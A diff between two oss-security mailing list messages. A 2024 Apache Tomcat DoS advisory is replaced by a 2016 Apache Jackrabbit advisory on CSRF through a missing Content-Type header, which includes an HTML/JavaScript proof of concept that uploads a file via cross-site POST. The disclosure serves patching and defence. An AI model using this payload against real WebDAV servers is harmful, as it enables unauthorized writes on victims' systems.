@@ -1,4 +1,9 @@
-Received: (qmail 22389 invoked by uid 550); 17 Dec 2024 15:55:30 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1769" "Wednesday" "14" "September" "2016" "14:34:22" "+0200" "Julian Reschke" "reschke@apache.org" "<3bb23017-9519-7dfc-0c6c-7364fb5bae42@apache.org>" "58" "[oss-security] CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type" nil nil nil "9" "2016091412:34:22" "[oss-security] CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type" (number mark "U       reschke@apac Sep 14   58/1769  " thread-indent "\"[oss-security] CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 25848 invoked by uid 550); 14 Sep 2016 13:36:51 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,41 +12,77 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 20159 invoked from network); 17 Dec 2024 12:47:18 -0000
-Authentication-Results: apache.org; auth=none
-Message-ID: <c34c3b29-70af-458f-8757-88810ad44f43@apache.org>
-Date: Tue, 17 Dec 2024 12:46:54 +0000
+Received: (qmail 25644 invoked from network); 14 Sep 2016 12:34:46 -0000
+To: Lukas Reschke <lukas@statuscode.ch>,
+ Jackrabbit Users <users@jackrabbit.apache.org>,
+ "dev@jackrabbit.apache.org" <dev@jackrabbit.apache.org>,
+ "security@apache.org" <security@apache.org>,
+ oss-security@lists.openwall.com, bugtraq@securityfocus.com
+From: Julian Reschke <reschke@apache.org>
+Message-ID: <3bb23017-9519-7dfc-0c6c-7364fb5bae42@apache.org>
+Date: Wed, 14 Sep 2016 14:34:22 +0200
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
+ Thunderbird/45.2.0
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-To: oss-security@lists.openwall.com
-From: Mark Thomas <markt@apache.org>
-Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Type: text/plain; charset=utf-8; format=flowed
 Content-Transfer-Encoding: 7bit
-Subject: [oss-security] CVE-2024-54677: Apache Tomcat: DoS in examples web application
+Subject: [oss-security] CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type
 
-Severity: low
+CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type
 
-Affected versions:
+Severity: Important
 
-- Apache Tomcat 11.0.0-M1 through 11.0.1
-- Apache Tomcat 10.1.0-M1 through 10.1.33
-- Apache Tomcat 9.0.0.M1 through 9.9.97
+Vendor:
+The Apache Software Foundation
+
+Versions Affected:
+Apache Jackrabbit 2.4.5
+Apache Jackrabbit 2.6.5
+Apache Jackrabbit 2.8.2
+Apache Jackrabbit 2.10.3
+Apache Jackrabbit 2.12.3
+Apache Jackrabbit 2.13.2
 
 Description:
+The CSRF content-type check for POST requests does not handle missing 
+Content-Type header fields, nor variations in field values with respect 
+to upper/lower case or optional parameters. This can be exploited to 
+create a resource via CSRF.
 
-Uncontrolled Resource Consumption vulnerability in the examples web 
-application provided with Apache Tomcat leads to denial of service.
+Mitigation:
+2.4.x users upgrade to 2.4.5 and apply the patch in 
+http://svn.apache.org/r1758791 and/or upgrade to 2.4.6 once released
+2.6.x users upgrade to 2.6.5 and apply the patch in 
+http://svn.apache.org/r1758771 and/or upgrade to 2.6.6 once released
+2.8.x users upgrade to 2.8.2 and apply the patch in 
+http://svn.apache.org/r1758764 and/or upgrade to 2.8.3 once released
+2.10.x users should upgrade to 2.10.4
+2.12.x users should upgrade to 2.12.4
+2.13.x users should upgrade to 2.13.3
 
-This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.1, from 
-10.1.0-M1 through 10.1.33, from 9.0.0.M1 through 9.9.97.
+Example:
+A resource can be created like so:
+<html>
+   <body>
+     <script>
+       function submitRequest()
+       {
+         var xhr = new XMLHttpRequest();
+         xhr.open("POST", "http://localhost:42427/test/csrf.txt", true);
+         xhr.withCredentials = true;
+         var body = "This file has been uploaded via CSRF.=\r\n";
+         var aBody = new Uint8Array(body.length);
+         for (var i = 0; i < aBody.length; i++)
+           aBody[i] = body.charCodeAt(i);
+         xhr.send(new Blob([aBody]));
+       }
+     </script>
+     <form action="#">
+       <input type="button" value="Submit request" 
+onclick="submitRequest();" />
+     </form>
+   </body>
+</html>
 
-Users are recommended to upgrade to version 11.0.2, 10.1.34 or 9.0.98, 
-which fixes the issue.
-
-References:
-
-https://lists.apache.org/thread/tdtbbxpg5trdwc2wnopcth9ccvdftq2n
-https://tomcat.apache.org/
-https://www.cve.org/CVERecord?id=CVE-2024-54677
+Credit:
+This issue was discovered by Lukas Reschke.
